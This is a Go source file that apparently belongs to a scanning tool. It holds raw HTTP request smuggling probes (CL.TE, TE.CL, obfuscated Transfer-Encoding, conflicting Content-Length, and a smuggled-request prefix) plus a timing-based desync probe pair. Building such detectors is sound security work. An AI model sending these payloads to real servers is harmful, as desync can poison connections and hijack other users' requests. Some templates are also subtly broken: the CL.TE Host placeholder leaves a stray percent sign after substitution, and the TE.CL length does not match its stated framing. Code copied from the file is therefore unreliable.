package rawhttp

import (
	"fmt"
	"strings"
)

// SmuggleVariant is a named request-smuggling probe shape.
type SmuggleVariant struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	// Build renders the probe as a raw request for the given front-end
	// (attacker-controlled) path and payload body.
	Build func(path string, marker string) string `json:"-"`
}

// SmuggleVariants returns the classic desync detection probes:
// CL.TE, TE.CL, TE.TE (duplicate/obfuscated Transfer-Encoding).
// Detection methodology (PortSwigger): send a probe that makes front-end and
// back-end disagree about message boundaries; a differential in the follow-up
// response (timing shift or error) indicates desync.
func SmuggleVariants() []SmuggleVariant {
	return []SmuggleVariant{
		{
			Name:        "CL.TE",
			Description: "front-end trusts Content-Length, back-end trusts Transfer-Encoding. Send partial chunk; if the back-end waits for the chunk terminator the follow-up request times out or desyncs.",
			Build: func(path, marker string) string {
				return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %%HOST%%%%\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ", path)
			},
		},
		{
			Name:        "TE.CL",
			Description: "front-end trusts Transfer-Encoding, back-end trusts Content-Length. Send a body whose CL-framed remainder looks like a smuggled request.",
			Build: func(path, marker string) string {
				body := fmt.Sprintf("0\r\n\r\nGET /%s HTTP/1.1\r\nHost: localhost\r\n\r\n", marker)
				return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %%HOST%%\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n%s", path, len(body), body)
			},
		},
		{
			Name:        "TE.TE-dup",
			Description: "duplicate Transfer-Encoding headers with different values; servers that disagree on which wins desync.",
			Build: func(path, marker string) string {
				return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %%HOST%%\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\nQ", path)
			},
		},
		{
			Name:        "TE.TE-obf-space",
			Description: "space before colon in header name ('Transfer-Encoding :') breaks strict parsers, accepted by lenient ones.",
			Build: func(path, marker string) string {
				return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %%HOST%%\r\nTransfer-Encoding : chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\nQ", path)
			},
		},
		{
			Name:        "TE.TE-obf-tab",
			Description: "tab after colon variant.",
			Build: func(path, marker string) string {
				return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %%HOST%%\r\nTransfer-Encoding:\tchunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\nQ", path)
			},
		},
		{
			Name:        "CL.CL-conflict",
			Description: "two conflicting Content-Length headers.",
			Build: func(path, marker string) string {
				return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %%HOST%%\r\nContent-Length: 8\r\nContent-Length: 4\r\n\r\nZQZQZQZQ", path)
			},
		},
		{
			Name:        "TE-x-chunked",
			Description: "unknown encoding value 'xchunked' alongside chunked.",
			Build: func(path, marker string) string {
				return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %%HOST%%\r\nTransfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\nQ", path)
			},
		},
		{
			Name:        "CL-prefix-body",
			Description: "smuggled request prefixed inside CL body with detection marker; any later response referencing the marker indicates desync.",
			Build: func(path, marker string) string {
				smuggled := fmt.Sprintf("GET /%s HTTP/1.1\r\nHost: %%HOST%%\r\n\r\n", marker)
				return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %%HOST%%\r\nContent-Length: %d\r\n\r\n%s", path, len(smuggled), smuggled)
			},
		},
	}
}

// TimingProbe builds a pair of requests used for timing-based desync
// detection: the first poisons connection framing, the second measures whether
// the connection stalled (back-end waiting for more bytes).
func TimingProbe(path string) (probe, followUp string) {
	probe = "POST " + path + " HTTP/1.1\r\nHost: %HOST%\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ"
	followUp = "GET / HTTP/1.1\r\nHost: %HOST%\r\n\r\n"
	return probe, followUp
}

// NormalizeWire applies %HOST% substitution in a probe template.
func NormalizeWire(tpl, host string) string {
	return strings.ReplaceAll(tpl, "%HOST%", host)
}
